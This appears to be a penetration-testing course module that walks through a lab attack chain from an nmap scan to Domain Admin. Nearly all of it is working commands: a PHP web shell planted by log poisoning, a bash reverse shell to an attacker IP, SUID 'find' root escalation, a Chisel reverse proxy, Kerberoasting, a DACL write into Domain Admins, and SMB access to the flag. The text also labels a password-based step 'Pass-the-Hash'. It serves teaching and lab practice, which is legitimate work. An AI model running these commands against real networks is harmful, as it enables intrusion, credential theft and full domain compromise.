# Module 20: Final Project - End-to-End Attack Chain Example

This example demonstrates a complete attack chain from external enumeration to Domain Admin.

## Phase 1: Reconnaissance & Initial Access

**1. Nmap Scan of the Target**
```bash
nmap -sC -sV -p- 10.10.10.50
# Finds Port 80 (HTTP) running a vulnerable CMS and Port 22 (SSH).
```

**2. Web Vulnerability Exploitation**
The CMS is vulnerable to Local File Inclusion (LFI). We use it to read `/etc/passwd`, then poison the Apache access log to gain a web shell.
```bash
# Upload reverse shell payload via log poisoning
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://10.10.10.50/
# Trigger reverse shell
curl http://10.10.10.50/index.php?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.10.10/4444%200%3E%261'
```

## Phase 2: Post-Exploitation & Privilege Escalation

**1. SUID Binary Enumeration**
```bash
find / -perm -u=s -type f 2>/dev/null
# Discovers /usr/bin/find has SUID bit set.
```

**2. Root Privilege Escalation**
Using GTFOBins methodology for `find`.
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami returns 'root'
```

## Phase 3: Pivoting and Internal Enumeration

**1. Establishing a Pivot**
Set up a dynamic proxy to reach the internal subnet (192.168.1.0/24) using Chisel.
```bash
# Start chisel server on attacker
./chisel server -p 8000 --reverse
# Connect chisel client from the compromised root shell
./chisel client 10.10.10.10:8000 R:socks
```

**2. Kerberoasting via Proxy**
Using proxychains to run Impacket against the internal Domain Controller (192.168.1.100).
```bash
proxychains impacket-GetUserSPNs globalcorp.local/service_sql:Password123 -request -dc-ip 192.168.1.100 -outputfile spns.txt
# Crack the hash using Hashcat to reveal password 'Welcome2023!'
```

## Phase 4: Domain Dominance

**1. BloodHound Analysis**
BloodHound reveals that the cracked service account has `GenericWrite` privileges over the Domain Admins group.

**2. Exploiting GenericWrite (Pass-the-Hash/Impacket)**
We add our controlled user to the Domain Admins group.
```bash
proxychains impacket-dacledit globalcorp.local/service_sql:'Welcome2023!' -action write -principal service_sql -target-dn 'CN=Domain Admins,CN=Users,DC=globalcorp,DC=local' -dc-ip 192.168.1.100
```

**3. Reading the Flag**
Now a Domain Admin, we dump the DC hashes using secretsdump or directly access the file share.
```bash
proxychains impacket-smbclient globalcorp.local/service_sql:'Welcome2023!'@192.168.1.100
# smbclient> use C$
# smbclient> cd Flags
# smbclient> get secret.txt
```
